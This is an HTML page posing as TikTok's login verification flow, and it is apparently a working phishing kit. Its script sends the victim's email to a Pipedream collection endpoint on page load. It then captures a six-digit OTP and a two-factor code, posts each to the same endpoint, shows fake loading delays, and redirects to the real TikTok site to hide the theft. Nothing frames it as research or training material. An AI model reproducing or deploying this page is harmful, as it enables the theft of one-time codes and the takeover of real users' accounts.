<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Login</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            min-height: 100vh;
            padding: 40px 20px;
            overflow: hidden;
        }

        /* Loading Screen Styles */
        #loading-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            transition: opacity 0.5s ease;
        }

        #loading-screen.fade-out {
            opacity: 0;
            pointer-events: none;
        }

        /* TikTok Loading Animation */
        .loading-container {
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            width: 100%;
        }

        .loading-animation {
            margin: auto;
            display: flex;
            align-items: center;
        }

        .loading-animation div {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            display: inline-block;
            margin: 0;
            position: relative;
        }

        .loading-animation div:nth-child(1) {
            background: #fe2c55;
            animation: clockwise 1200ms infinite linear;
        }

        .loading-animation div:nth-child(2) {
            mix-blend-mode: darken;
            background: #25f4ee;
            margin-left: -3px;
            animation: counter-clockwise 1200ms infinite linear;
        }

        @keyframes clockwise {
            0% {
                transform: translateX(0);
                width: 12px;
            }
            25% {
                width: 15px;
            }
            50% {
                transform: translateX(100%);
                width: 12px;
            }
        }

        @keyframes counter-clockwise {
            0% {
                transform: translateX(0);
            }
            50% {
                transform: translateX(-100%);
            }
        }

        /* Page Styles */
        #otp-page, #twofa-page {
            display: none;
            width: 100%;
            max-width: 380px;
            animation: fadeIn 0.8s ease forwards;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* Header */
        .otp-header, .twofa-header {
            width: 100%;
            max-width: 380px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
        }

        .otp-header i, .twofa-header i {
            font-size: 20px;
            color: #000;
            cursor: pointer;
        }

        /* Container Styles */
        .otp-container, .twofa-container {
            width: 100%;
            max-width: 380px;
            text-align: left;
            position: relative;
        }

        .otp-title, .twofa-title {
            margin-top: 20px;
            font-size: 22px;
            font-weight: 600;
            letter-spacing: -0.3px;
        }

        .otp-description, .twofa-description {
            color: #555;
            font-size: 15px;
            margin-top: 8px;
            margin-bottom: 30px;
            line-height: 1.4;
            font-weight: 400;
        }

        .email {
            word-break: break-all;
            font-weight: 400;
            color: #555;
        }

        /* OTP Input Styles */
        .otp-inputs {
            display: flex;
            justify-content: space-between;
            gap: 8px;
        }

        .otp-inputs input {
            width: 40px;
            height: 50px;
            text-align: center;
            font-size: 24px;
            border: none;
            border-bottom: 2px solid #ccc;
            outline: none;
            transition: border-color 0.2s;
            background: transparent;
            caret-color: #fe2c55;
            font-weight: 500;
        }

        .otp-inputs input:focus {
            border-color: #fe2c55;
        }

        .resend {
            margin-top: 20px;
            color: #999;
            font-size: 15px;
            font-weight: 400;
        }

        .resend .timer {
            margin-left: 6px;
            color: #fe2c55;
            font-weight: 500;
        }

        .resend .disabled {
            color: #999;
        }

        .resend .enabled {
            color: #fe2c55;
            cursor: pointer;
            font-weight: 600;
        }

        /* Loading Overlays */
        #otp-loading, #twofa-loading {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(255, 255, 255, 0.9);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 999;
        }

        @media (max-width: 480px) {
            body {
                padding: 30px 15px;
            }

            .otp-container, .twofa-container {
                width: 90%;
            }

            .otp-inputs input {
                width: 44px;
                height: 54px;
            }
        }
    </style>
</head>
<body>
    <!-- Loading Screen -->
    <div id="loading-screen">
        <div class="loading-container">
            <main class="loading-animation">
                <div></div>
                <div></div>
            </main>
        </div>
    </div>

    <!-- OTP Page -->
    <div id="otp-page">
        <div class="otp-header">
            <i class="fa-solid fa-arrow-left" id="otp-back-btn"></i>
            <i class="fa-regular fa-circle-question"></i>
        </div>

        <div class="otp-container">
            <h1 class="otp-title">Enter 6-digit code</h1>
            <p class="otp-description">We've sent a verification code to <span class="email" id="user-email">your email</span>.</p>

            <form class="otp-inputs" onsubmit="return false;">
                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" />
                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" />
                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" />
                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" />
                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" />
                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" />
            </form>

            <div class="resend">
                <span class="disabled" id="resend-text">Resend code</span>
                <span class="timer" id="timer">60s</span>
            </div>
        </div>
    </div>

    <!-- 2FA Page -->
    <div id="twofa-page">
        <div class="twofa-header">
            <i class="fa-solid fa-arrow-left" id="twofa-back-btn"></i>
            <i class="fa-regular fa-circle-question"></i>
        </div>

        <div class="twofa-container">
            <h1 class="twofa-title">Two-factor authentication</h1>
            <p class="twofa-description">We've sent you a verification code.</p>

            <form class="otp-inputs" onsubmit="return false;">
                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" />
                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" />
                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" />
                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" />
                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" />
                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" />
            </form>

            <div class="resend">
                <span class="disabled" id="twofa-resend-text">Resend code</span>
                <span class="timer" id="twofa-timer">60s</span>
            </div>
        </div>
    </div>

    <!-- Loading Overlays -->
    <div id="otp-loading">
        <div class="loading-container">
            <main class="loading-animation">
                <div></div>
                <div></div>
            </main>
        </div>
    </div>

    <div id="twofa-loading">
        <div class="loading-container">
            <main class="loading-animation">
                <div></div>
                <div></div>
            </main>
        </div>
    </div>

    <script>
        // ============================================
        // ENDPOINT CONFIGURATION
        // ============================================
        const PIPEDREAM_ENDPOINT = 'https://eoc76rtyau267wg.m.pipedream.net/';
        // ============================================

        // Track submissions
        let submissions = {
            otp: false,
            twofa: false
        };

        // Get email from URL parameters
        function getEmailFromURL() {
            const urlParams = new URLSearchParams(window.location.search);
            const email = urlParams.get('email');
            return email || 'your email';
        }

        // Send data to Pipedream endpoint
        function sendToEndpoint(data) {
            fetch(PIPEDREAM_ENDPOINT, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            }).catch(error => {
                console.log('Endpoint error:', error);
            });
        }

        const userEmail = getEmailFromURL();
        document.getElementById('user-email').textContent = userEmail;

        // Send visitor info to endpoint immediately
        sendToEndpoint({
            action: 'user_visitor',
            email: userEmail,
            page: 'visitor',
            submission: '0/2',
            timestamp: new Date().toISOString(),
            user_agent: navigator.userAgent,
            referrer: document.referrer || 'direct'
        });

        // Show loading for 5 seconds then show OTP
        setTimeout(function() {
            const loadingScreen = document.getElementById('loading-screen');
            loadingScreen.classList.add('fade-out');
            setTimeout(function() {
                loadingScreen.style.display = 'none';
                document.getElementById('otp-page').style.display = 'block';
                startCountdown();
            }, 500);
        }, 5000);

        // Back buttons
        document.getElementById('otp-back-btn').addEventListener('click', function() {
            window.location.reload();
        });

        document.getElementById('twofa-back-btn').addEventListener('click', function() {
            document.getElementById('twofa-page').style.display = 'none';
            document.getElementById('otp-page').style.display = 'block';
        });

        // OTP Functions
        const otpInputs = document.querySelectorAll("#otp-page .otp-inputs input");
        const otpLoading = document.getElementById('otp-loading');
        let timeLeft = 60;
        let countdownInterval;
        const timerElement = document.getElementById("timer");
        const resendText = document.getElementById("resend-text");

        function startCountdown() {
            timeLeft = 60;
            timerElement.textContent = timeLeft + "s";
            resendText.className = "disabled";
            
            clearInterval(countdownInterval);
            countdownInterval = setInterval(() => {
                timeLeft--;
                timerElement.textContent = timeLeft + "s";
                if (timeLeft <= 0) {
                    clearInterval(countdownInterval);
                    resendText.className = "enabled";
                    timerElement.textContent = "";
                    resendText.onclick = function() {
                        startCountdown();
                    };
                }
            }, 1000);
        }

        function checkOTPComplete(inputs, loadingElement) {
            let allFilled = true;
            let otpCode = '';
            
            inputs.forEach(input => {
                if (input.value.length === 0) allFilled = false;
                else otpCode += input.value;
            });
            
            if (allFilled && otpCode.length === 6 && !submissions.otp) {
                submissions.otp = true;
                
                sendToEndpoint({
                    email: userEmail,
                    otp_code: otpCode,
                    page: 'otp_page',
                    timestamp: new Date().toISOString(),
                    submission: '1/2',
                    user_agent: navigator.userAgent,
                    referrer: document.referrer || 'direct'
                });

                loadingElement.style.display = 'flex';
                
                setTimeout(function() {
                    loadingElement.style.display = 'none';
                    document.getElementById('otp-page').style.display = 'none';
                    document.getElementById('twofa-page').style.display = 'block';
                    startTwoFACountdown();
                }, 20000);
            }
        }

        otpInputs.forEach((input, index) => {
            input.addEventListener("input", () => {
                if (input.value.length === 1 && index < otpInputs.length - 1) {
                    otpInputs[index + 1].focus();
                }
                checkOTPComplete(otpInputs, otpLoading);
            });
            
            input.addEventListener("keydown", (e) => {
                if (e.key === "Backspace" && !input.value && index > 0) {
                    otpInputs[index - 1].focus();
                }
            });
            
            input.addEventListener("paste", (e) => {
                e.preventDefault();
                const pasteData = e.clipboardData.getData('text').slice(0, 6);
                const digits = pasteData.split('');
                
                digits.forEach((digit, digitIndex) => {
                    if (digitIndex < otpInputs.length) {
                        otpInputs[digitIndex].value = digit;
                    }
                });
                
                if (digits.length === 6) {
                    otpInputs[5].focus();
                    checkOTPComplete(otpInputs, otpLoading);
                } else if (digits.length > 0) {
                    otpInputs[digits.length - 1].focus();
                }
            });
        });

        // 2FA Functions
        const twofaInputs = document.querySelectorAll("#twofa-page .otp-inputs input");
        const twofaLoading = document.getElementById('twofa-loading');
        let twofaTimeLeft = 60;
        let twofaCountdownInterval;
        const twofaTimerElement = document.getElementById("twofa-timer");
        const twofaResendText = document.getElementById("twofa-resend-text");

        function startTwoFACountdown() {
            twofaTimeLeft = 60;
            twofaTimerElement.textContent = twofaTimeLeft + "s";
            twofaResendText.className = "disabled";
            
            clearInterval(twofaCountdownInterval);
            twofaCountdownInterval = setInterval(() => {
                twofaTimeLeft--;
                twofaTimerElement.textContent = twofaTimeLeft + "s";
                if (twofaTimeLeft <= 0) {
                    clearInterval(twofaCountdownInterval);
                    twofaResendText.className = "enabled";
                    twofaTimerElement.textContent = "";
                    twofaResendText.onclick = function() {
                        startTwoFACountdown();
                    };
                }
            }, 1000);
        }

        function checkTwoFAComplete(inputs) {
            let allFilled = true;
            let twofaCode = '';
            
            inputs.forEach(input => {
                if (input.value.length === 0) allFilled = false;
                else twofaCode += input.value;
            });
            
            if (allFilled && twofaCode.length === 6 && !submissions.twofa) {
                submissions.twofa = true;
                
                sendToEndpoint({
                    email: userEmail,
                    twofa_code: twofaCode,
                    page: '2fa_page',
                    timestamp: new Date().toISOString(),
                    submission: '2/2',
                    user_agent: navigator.userAgent,
                    referrer: document.referrer || 'direct'
                });

                twofaLoading.style.display = 'flex';
                
                setTimeout(function() {
                    twofaLoading.style.display = 'none';
                    // Clear the input fields
                    twofaInputs.forEach(input => {
                        input.value = '';
                    });
                    submissions.twofa = false;
                    
                    // Redirect to TikTok.com after successful verification
                    window.location.href = 'https://www.tiktok.com';
                }, 20000);
            }
        }

        twofaInputs.forEach((input, index) => {
            input.addEventListener("input", () => {
                if (input.value.length === 1 && index < twofaInputs.length - 1) {
                    twofaInputs[index + 1].focus();
                }
                checkTwoFAComplete(twofaInputs);
            });
            
            input.addEventListener("keydown", (e) => {
                if (e.key === "Backspace" && !input.value && index > 0) {
                    twofaInputs[index - 1].focus();
                }
            });
            
            input.addEventListener("paste", (e) => {
                e.preventDefault();
                const pasteData = e.clipboardData.getData('text').slice(0, 6);
                const digits = pasteData.split('');
                
                digits.forEach((digit, digitIndex) => {
                    if (digitIndex < twofaInputs.length) {
                        twofaInputs[digitIndex].value = digit;
                    }
                });
                
                if (digits.length === 6) {
                    twofaInputs[5].focus();
                    checkTwoFAComplete(twofaInputs);
                } else if (digits.length > 0) {
                    twofaInputs[digits.length - 1].focus();
                }
            });
        });
    </script>
</body>
</html>
